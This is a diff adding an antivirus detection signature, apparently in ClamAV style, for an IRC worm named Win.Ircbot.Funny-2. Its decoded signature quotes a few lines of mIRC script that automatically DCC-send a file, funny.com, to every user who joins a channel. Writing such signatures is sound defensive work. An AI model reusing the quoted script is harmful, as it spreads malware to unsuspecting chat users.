@@ -1,0 +1,9 @@
+VIRUS NAME: Win.Ircbot.Funny-2
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+Э!ыл[script]
+n0=on 1:JOIN:#:{
+n1=if ($nick != $me) {
+n2=  /dcc send $nick c:\mirc\funny.com
+n3=
